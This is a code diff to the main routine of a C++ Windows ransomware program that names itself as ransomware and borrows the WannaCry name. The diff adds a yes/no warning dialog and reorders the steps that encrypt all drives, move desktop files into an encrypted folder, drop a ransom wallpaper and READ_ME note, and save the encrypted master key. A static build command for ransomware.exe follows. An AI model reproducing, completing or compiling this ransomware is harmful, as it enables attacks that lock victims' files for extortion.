@@ -9,26 +9,34 @@
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     
-    
+    int response = MessageBoxA(NULL, "Do you want to start the Ransomware (it is highly malicious software that can and will corrupt your files) ?", "If you don't know anything about that software PRESS NO", MB_YESNO | MB_ICONQUESTION | MB_TOPMOST);
+    if (response != IDYES) {
+        return 0;
+    }
     OpenSSL_add_all_algorithms();
     ERR_load_crypto_strings();
 
     try {
         SecureBuffer masterKey = generateAESKey();
         if (!IsEncryptionMarkerPresent()) {
-            std::atomic<size_t> count(0), skipped(0);
-            EncryptAllDrives(masterkey, true, count, skiped);
+            
 
-            WriteEncryptedMasterKeyToFile(masterKey);
+            
+        
+            std::atomic<size_t> count(0), skipped(0);
+            EncryptAllDrives(masterKey, true, count, skiped);
+
+            
 
             wchar_t desktopPath[MAX_PATH];
             if (SUCCEEDED(SHGetSpecialFolderPathW(NULL, desktopPath, CSIDL_DESKTOP, FALSE))) {
                 std::wstring wallpaperPath = std::wstring(desktopPath) + L"\\ransom_wallpaper.bmp";
                 std::wstring readmePath = std::wstring(desktopPath) + L"\\READ_ME.txt";
-                GenerateWallpaperAndNote(wallpaperPath, readmePath);
                 MoveDesktopItems(L"My_Encrypted_Files");
+                GenerateWallpaperAndNote(wallpaperPath, readmePath);
                 ShowSkull();
             }
+            WriteEncryptedMasterKeyToFile(masterKey);
             CreateEncryptionMarker();
         }
         const wchar_t CLASS_NAME[] = L"WannaCryWindowClass";
@@ -75,4 +83,4 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     ERR_free_strings();
 
     return 0;
-}//g++ -std=c++17 -O2 -IModules Modules/asymmetric.cpp Modules/symmetric.cpp Modules/other_functions.cpp Modules/visual.cpp ransomware.cpp resource.res -mwindows -lcrypto -lssl -Wdeprecated-declarations -lws2_32 -lgdi32 -lcrypt32 -lshlwapi -lstdc++fs -lole32 -lshell32 -luuid -lwinmm -static -o ransomware.exe
+}//g++ -std=c++17 -O2 -IModules Modules/asymmetric.cpp Modules/symmetric.cpp Modules/other_functions.cpp Modules/visual.cpp ransomware.cpp -mwindows -lcrypto -lssl -Wdeprecated-declarations -lws2_32 -lgdi32 -lcrypt32 -lshlwapi -lstdc++fs -lole32 -lshell32 -luuid -static -o ransomware.exe
